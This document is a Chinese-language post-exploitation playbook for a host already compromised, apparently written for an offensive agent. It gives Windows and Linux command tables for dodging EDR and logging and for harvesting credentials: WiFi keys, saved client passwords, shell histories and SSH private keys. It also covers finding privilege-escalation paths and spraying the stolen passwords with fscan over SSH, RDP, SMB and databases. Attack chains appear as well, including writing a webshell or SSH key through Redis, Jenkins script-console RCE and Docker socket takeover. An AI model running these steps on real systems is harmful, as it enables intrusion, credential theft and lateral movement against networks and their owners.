# 单机落点信息收集（已控主机）

> 定位：拿到一台主机的执行通道（交互 shell / webshell 命令执行）后的**渐进式全量收集命令库**。
> 渐进式 = 先轻量识别，再按模块逐层收集，按前面发现决定深挖方向——避免一次性灌入大量命令
> 导致关键信息被淹没。**只做收集类操作**；破坏性/变更性动作（关防火墙、改注册表、删文件）
> 先呈报用户确认（与 ad-playbook 痕迹纪律一致）。
> 执行通道差异（交互 shell / webshell / 远程执行 RPC）只影响「怎么跑命令」，不影响收集面本身；
> 通道常见坑见文末「执行通道适配」。
> 工具（fscan/searchall/浏览器密码导出等）按检测制约定：`command -v` 探测，缺失走四级兜底
> （脚本替代或安装请求），**不随预设分发任何二进制**。

## 三阶段视角（收集服务于目标）

- **权限提升**：系统/内核版本、补丁、出网情况、服务端口、环境变量、中间件、计划任务
- **权限维持**：账号/用户组、注册表、自启动、计划任务、SSH 后门痕迹、中间件
- **横向移动**：网卡/内网 IP、网络外连、密码抓取、配置文件、内网存活主机、端口服务

按当前所处阶段选重点，不做无目的全量收集。

## 阶段 0：OS 识别 + OPSEC 基线（先做）

`os-identify` `opsec-baseline`

```bat
:: Windows
echo %OS%            & :: Windows_NT → Windows 目标
tasklist | findstr /i "sysmon Sysmon64"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" 2>nul
```

```bash
# Linux
uname -a
ps aux | grep -E "auditd|osquery|wazuh|elastic-agent|falcon" | grep -v grep
```

- 有 Sysmon/PowerShell 日志（Windows）→ 后续优先 cmd 原生命令，少用 PowerShell
- 有 auditd/EDR（Linux）→ 减少大量文件操作，谨慎上传工具
- 识别结果与模块计划先报告再进入基础收集

## Windows 模块（W1~W21）

| # | 模块 | 命令要点 | 提取什么 |
|---|---|---|---|
| W1 | 用户与组 `win-users` | `whoami /all`；`net user`；`net localgroup administrators`；`query user` | 当前权限/可提权账户/在线会话 |
| W2 | 系统信息 `win-system` | `systeminfo`（补丁列表）；`wmic qfe get HotFixID`（或 PS `Get-HotFix`） | 内核版本→提权 EXP 匹配；缺失补丁 |
| W3 | 网络与外连 `win-netstat` | `netstat -ano`（失败换 `Get-NetTCPConnection`）；`ipconfig /all`；`arp -a`；`route print` | **双向**：外连内网 IP（站库分离/横向目标）+ 被连（LISTENING + ESTABLISHED）+ 多网卡跨网段 |
| W4 | 进程与服务 `win-proc` | `tasklist /v`；`wmic process get CommandLine`（失败 `Get-CimInstance Win32_Process`）；`net start`；`sc query state= all` | 杀软/EDR 识别（免杀评估）、数据库/中间件/远控进程、命令行里的密码与配置路径、非标准高位端口（9999/18080 管理后台） |
| W5 | 已装软件 `win-software` | `wmic product get name,version`（慢，限高价值时）；注册表 `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s /v DisplayName`（分段查） | 可挖应用（历史漏洞组件）+ 触发 W21 客户端凭据 |
| W6 | 防火墙 `win-fw` | `netsh advfirewall show allprofiles`；`netsh firewall show config`（旧系统） | 攻击面是否被墙、出网限制 |
| W7 | RDP/远程 `win-rdp` | `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections`；`query termserver`（第三方） | RDP 是否开（0=开）→ 触发 W10 |
| W8 | Web 配置 `win-webconfig` | 常见路径：`C:\inetpub\wwwroot\web.config`、`C:\phpstudy_pro\WWW\`、Tomcat `conf\server.xml`、`type ... \| findstr /i "password conn"` | 数据库账号密码、后台路径、应用密钥 |
| W9 | 数据库/中间件 `win-dbconfig` | 定位 my.ini/application.yml/conf 目录后 `type` 读取；注册表 `reg query HKLM\SOFTWARE\MySQL` 等 | 连接串→连库→INFORMATION_SCHEMA 找含 user/password 字段的表 |
| W10 | 凭据（cmdkey/RDP/WiFi）`win-creds` | `cmdkey /list`；`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`（缓存登录）；`netsh wlan show profiles` + `netsh wlan show profile name="X" key=clear` | 横向目标凭据；RDP 记录→关联 IP（触发资产归纳） |
| W11 | 域判断 `win-domain` | `net config workstation`；`systeminfo \| findstr /i "domain"`；`nltest /dsgetdc:%USERDOMAIN%` | WORKGROUP=单机；域环境→域攻防线（BloodHound/kerberoast，见 offensive/ AD 系） |
| W12 | 敏感文件 `win-files` | `dir /s /b C:\Users\*\Desktop C:\Users\*\Downloads 2>nul`；`dir /s /b C:\*.conf C:\*.sql 2>nul \| findstr /v /i "windows program"` | 桌面/下载=密码、证书、脚本最集中处；全盘内容搜索放横向受阻时 |
| W13 | 内网网段 `win-segments` | 从 W3 `ipconfig /all` 汇总各网卡网段；`route print` 非默认路由 | 段级扫描输入 + 跨网段跳板标记 |
| W14 | 持久化面 `win-persistence` | `reg query HKCU\...\Run` + HKLM 同键；`dir "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"`；`schtasks /query /fo csv /v \| findstr /v "\Microsoft"` | 排查他人后门/挖矿；自身维持点位（落地即登记 persistence-registry） |
| W15 | 横向通道 `win-lateral` | `net share`（可能交互卡死，自动化用注册表 `reg query HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares` 替代）；`net session`；`tasklist /v \| findstr /i "sshd vnc rdp todesk"` | 本机对外共享面、远程管理通道（445/3389/5985/22/远控）——横向通道清单，与 L12 对应 |
| W16 | PowerShell 历史 `win-pshist` | `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`；遍历 `C:\Users\*\AppData\...\ConsoleHost_history.txt` | 历史=宝藏：连过的 IP、带密码的命令、运维习惯 |
| W17 | 最近文件/回收站 `win-recent` | `dir /s /b %APPDATA%\Microsoft\Windows\Recent`；`Get-ChildItem 'C:\$Recycle.Bin' -Recurse -Force`（回收站需 PS） | 最近操作文件→正在用的资产 |
| W18 | WSL/Hyper-V `win-wsl` | `wsl -l -v`；`dir C:\Users\*\AppData\Local\Packages\*Ubuntu*` | 开发机常见：WSL 内密钥/历史/SSH 配置 |
| W19 | Redis 缓存 `win-redis` | `redis-cli -h <ip> ping`（目标本机客户端优先）→ `info keyspace` → `keys "*"` → `get` 会话/令牌键 | 未授权→keyspace→缓存里的库凭据/JWT/会话 |
| W20 | 应用配置提取 `win-appconfig` | Java：注册表/进程找 jar 路径 → PS 解 jar（`[IO.Compression.ZipFile]::OpenRead`）读 `application*.yml`；`findstr /si /m "password" C:\apps\*.yml *.properties *.xml` | JWT 密钥/多数据源/Druid 控制台/knife4j 端点 |
| W21 | 客户端凭据 `win-clientcreds` | Navicat：`reg query HKCU\Software\PremiumSoft\Navicat\Servers /s`（主机/用户/加密密码）；Xshell/WinSCP/TeamViewer/todesk/向日葵(Sunlogin) 的注册表与 conf 目录 | 每个客户端=一组「主机+账号+密码」→ 直接连 |

## Linux 模块（L1~L14）

| # | 模块 | 命令要点 | 提取什么 |
|---|---|---|---|
| L1 | 用户与权限 `linux-users` | `id`；`cat /etc/passwd \| grep -v nologin`；`sudo -l`；`cat /etc/sudoers`（可读时） | 可登录账户、sudo 提权面（触发 L13） |
| L2 | 网络与外连 `linux-netstat` | `ss -tunap`（或 netstat -antup）；`ip a`；`ip r`；`arp -n` | 同 W3 双向分析 + 段识别 |
| L3 | 计划任务 `linux-cron` | `crontab -l`；`ls -la /etc/cron* /var/spool/cron/`；`cat /etc/crontab` | 挖矿/后门最爱的落点（隐藏目录 `/etc/.cache` 同查）；任务脚本常含明文密码 |
| L4 | 进程与服务 `linux-proc` | `ps auxf`；`systemctl list-units --type=service --state=running`；`cat /proc/*/cmdline 2>/dev/null \| grep -i pass` | 同 W4；`kworker` 伪装、异常外联进程 |
| L5 | 历史命令（所有用户）`linux-history` | `cat /home/*/.bash_history /root/.bash_history 2>/dev/null`；`cat /home/*/.*history 2>/dev/null` | **必须遍历所有用户家目录**；ssh/mysql/psql 连接记录、密码明文 |
| L6 | 敏感文件 `linux-files` | `ls -la /home/*/ /root/`；`find /home /root -name "*.pem" -o -name "id_rsa" -o -name "*.kdbx" 2>/dev/null`；`cat /home/*/.ssh/* 2>/dev/null` | **所有用户的 .ssh**（私钥+authorized_keys+known_hosts） |
| L7 | Web 配置 `linux-webconfig` | `find / -maxdepth 4 -name "*.conf" -path "*nginx*" 2>/dev/null`；`cat /etc/nginx/sites-enabled/* /usr/local/*/conf/* 2>/dev/null`；find wwwroot 找 config.php/.env | 库凭据/虚拟主机清单/新站点 |
| L8 | 数据库/中间件 `linux-dbconfig` | `cat /etc/my.cnf /etc/mysql/my.cnf 2>/dev/null`；`grep -r "password" /etc/*.conf /opt/*/conf 2>/dev/null \| head` | 连库；redis-cli 本机验证（`ping`→PONG 即未授权） |
| L9 | 运维面板 `linux-panel` | 宝塔：`cat /www/server/panel/default.pl 2>/dev/null`；1Panel：`ls /opt/1panel/`；`ss -tlnp \| grep -E "8888\|10086\|888"` | 面板密码→全站管理权 |
| L10 | 内网网段 `linux-segments` | `ip a` + `ip r` 汇总；`cat /proc/net/route` | 段级扫描输入 + 跨网段标记 |
| L11 | 持久化后门检测 `linux-backdoor` | `ls -la /etc/ld.so.preload 2>/dev/null`；`cat /etc/rc.local`；`systemctl list-timers`；`cat /home/*/.ssh/authorized_keys`（陌生公钥）；`ls /dev/shm` | LD_PRELOAD 劫持、rc 后门、陌生公钥、shm 临时落地 |
| L12 | 横向通道 `linux-lateral` | `ss -tlnp`（445/3389/22/5985）；`showmount -e <nfs>`（如装）；`docker ps` + `cat /var/run/docker.sock` 权限；Ansible：`cat /etc/ansible/hosts` | SSH/NFS/Docker 横向面；运维主机清单=IP 大礼包 |
| L13 | 提权信息 `linux-privesc` | `find / -perm -4000 -maxdepth 4 2>/dev/null`；`getcap -r / 2>/dev/null`；`uname -r`（内核 EXP 匹配）；`ls -ld /tmp /var/tmp`（可写+执行） | SUID/Capabilities/内核版本/可写目录 → 提权路径 |
| L14 | 连接痕迹 `linux-traces` | `last -a`；`lastb`；`grep -i sshd /var/log/secure /var/log/auth.log 2>/dev/null \| tail -50`；`cat /home/*/.ssh/known_hosts 2>/dev/null`；`journalctl -u ssh --no-pager \| tail -100` | **本机访问过哪些机器**——私钥横向/爆破目标定位的关键 |

## 必做清单（阶段 1 收口自检，漏掉=信息不完整）

1. **所有用户家目录**都看过（Win `C:\Users\*\`；Linux `/home/*/` + `/root/`）——只查当前用户必漏
2. Windows：cmdkey/W10、已装软件/W5、桌面下载/W12、持久化/W14、PowerShell 历史/W16
3. Linux：crontab 全家桶/L3、所有用户历史/L5、所有用户 .ssh/L6、连接痕迹/L14、持久化/L11+L12
4. 隐藏目录（`/etc/.cache` 等）与 hosts 矿池屏蔽（挖矿排查）
5. 自检方式：对照模块表逐项标 ✅完成/⏭跳过(原因)/❌失败，向总控报覆盖情况后再进深挖

## 深挖触发表（发现 → 触发）

| 发现 | 触发 | 目的 |
|---|---|---|
| 6379 端口 / redis-cli | W19 | 缓存里的全套凭据 |
| Java/SpringBoot 进程 | W20 | jar 内配置→JWT 密钥/多数据源 |
| Navicat/Xshell 等客户端 | W21 | 连接记录=主机+账号+密码 |
| RDP 开启/连接记录 | W10 + ListRDPConnections 类工具（检测到时） | 关联 IP → 全端口 → 密码复用 |
| 计划任务 | 读任务脚本正文 | 备份脚本常含库明文密码 |
| 域环境迹象 | W11 → offensive/ AD 系 | 域内定位与域控 |
| 需要扩大攻击面（横向前置） | W15/L12 横向通道检查 | 本机共享/远程管理通道清单——横向路径的起点 |
| 多网卡/跨网段 | W13/L10 + 段级探测 | 跨网段跳板（打通拓扑） |
| 杀软/远控进程 | 免杀评估 | 载荷形态决策（协同 av-evasion） |
| 横向受阻 | W12/L6 全盘敏感词搜索 | 最后手段翻文件 |

## 服务组件追问（发现即沿链深挖）

对每个发现的服务问三个问题：**能未授权访问吗？拿到权限能做什么？它连着什么？**

- **Nacos 8848** → 未授权 API → 全部配置 → 库/Redis/AK-SK（每个都是新攻击面）
- **SpringBoot** → `/actuator/heapdump` → 堆内存提取密码/Shiro 密钥/连接串
- **Redis** → 未授权 → 写 webshell/SSH key/crontab 三选一
- **Jenkins** → `/script` 控制台 RCE；凭据管理 → 全部 Git/SSH 密码
- **Docker 2375** → 未授权挂载宿主根 → 读 shadow/写 SSH key
- **任何配置文件** → 不只提密码：微服务地址/缓存/MQ/第三方 API 全记
- 密码到手 → 永远先试复用（同机其他服务 + 同段相同服务）；进程命令行看启动参数里的密码/配置路径/非标端口

## 资产归纳与凭证发散（让信息「活」起来）

**① IP 归纳**（去重、标来源）：网络外连（W3/L2）/ RDP 记录（W10）/ hosts·ARP / 配置连接串（W8/W9/L7/L8）/ 敏感文件内容 / 网段（W13/L10）/ 注册中心实例 / 运维清单（L12）/ 历史命令（W16/L5）——全部来源的 IP 合并成「内网资产清单」登进 evidence-index 认知层，跨网段机器优先标记。

**② 深度扫描**（对归纳清单，非盲扫全段）：fscan 全端口（检测到时；缺失走四级兜底）——网络/配置/历史暴露的 IP 是**高价值定向目标**，比盲扫整段精准。

**③ 凭证发散爆破**（收集的密码只有撒出去才有价值）：

```bash
# 字典 = 收集到的全部密码去重 + 密码家族衍生（同前缀@年份）
fscan -hf ips.txt -m ssh  -p 22    -user root -pwdf pass.txt -o ssh.txt
fscan -hf ips.txt -m rdp  -p 3389 -user administrator -pwdf pass.txt -o rdp.txt
fscan -hf ips.txt -m smb  -p 445  -user administrator -pwdf pass.txt -o smb.txt
fscan -hf ips.txt -m mysql -p 3306 -pwdf pass.txt -o mysql.txt
fscan -hf ips.txt -m mssql -p 1433 -pwdf pass.txt -o mssql.txt
fscan -hf ips.txt -m redis -p 6379 -pwdf pass.txt -o redis.txt
```

- 优先爆破**配置/历史里暴露过的服务**；跨网段机器优先（打通拓扑）
- Web 后台：发现的登录页用收集的账号密码 + 弱口令尝试
- **新凭据立即记录 → 复用 → 再收集 → 循环扩大**（拿到一台→收集→再爆破）
- 爆破纪律：限速、防锁定（每账户低频），与速率纪律一致；sec-enforce 会拦裸奔全扫

**④ 敏感信息跨源关联**：同一 IP 跨源合并成一条资产 fact；密码绑定服务形成可复用凭据 fact；
SSH 私钥 ↔ known_hosts 求交（可登录主机清单）；API 密钥（sk-/AKIA）→ 对应云控制台接管面；
配置里的外联 IP/域名 → 新网段入口——全部以 `links`（discovered_on/leads_to/enables）写进
evidence-index 认知层，关系边聚合即攻击图。

## 执行通道适配（常见坑）

| 坑 | 现象 | 处置 |
|---|---|---|
| 管道符直接执行报错 | `'|' 不是内部命令` | PowerShell 原生过滤（`Where-Object`）或 `cmd /c "整条包裹"` |
| `type`/`dir` 无法执行 | CreateProcess error=2 | 换 PowerShell `Get-Content`/`Get-ChildItem` 或文件读取原语 |
| 中文输出乱码 | 终端 GBK 显示异常 | 数据多在、字段多英文；严重时 `chcp 65001` |
| 大输出超时/截断 | >20s 超时 | 缩小范围分段查（如注册表按子键查）；长任务异步跑输出到文件再读 |
| `wmic` 不存在 | Win11/新系统移除 | `Get-CimInstance Win32_Process/Win32_Service` 替代 |
| 交互式命令卡死 | `net share` 等待输入 | 自动化禁用交互命令，换非交互等价命令 |
| 引号嵌套破坏 | sqlcmd 参数被转义 | 去掉外层 `cmd /c`，SQL 内不用引号，先 `SELECT 1`/`SELECT TOP 5` 小样本验证 |
| 长任务挂起通道 | webshell 同步等待 | `setsid nohup ... &`（Linux）/ `wmic process call create`（Win）异步，输出落文件 |

## 与 playbook 的关系

- 本文是 ad-playbook「单机落点信息收集」节的命令级展开；覆盖自检对齐 playbook 阶段终态表
- 域攻防/横向工具（BloodHound/impacket 等）见 ad-playbook 附录 A-2 与本目录其余各篇
- 凭据抓取（mimikatz/LSASS 全谱）见 `intranet-credential-theft.md`、`intranet-password-collection.md`
- 拿到的可疑样本交 binary-analysis；免杀评估交 av-evasion；单机发现交本模式路径台账
